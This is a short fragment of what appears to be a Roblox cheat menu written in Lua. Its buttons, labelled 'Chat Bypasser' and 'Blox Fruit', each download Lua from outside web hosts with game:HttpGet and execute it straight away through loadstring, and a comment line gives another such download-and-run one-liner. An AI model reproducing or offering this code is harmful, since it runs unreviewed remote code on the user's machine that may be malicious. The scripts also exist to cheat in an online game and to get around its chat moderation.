...
Section:NewButton("Chat Bypasser", "chat bypass",function()
    loadstring(game:HttpGet("https://robloxscripts123.000webhostapp.com/vadrfits-old.lua"))()
end)
...
Section:NewButton("Blox Fruit", "yo chat is this real?",function()
    loadstring(game:HttpGet('https://robloxscripts123.000webhostapp.com/BloxFruit.lua'))()
end)
...
-- Blox Fruit Script 2 (Saving): loadstring(game:HttpGet("https://raw.githubusercontent.com/PNguyen0199/Script/main/Fai-Fao.lua",true))()
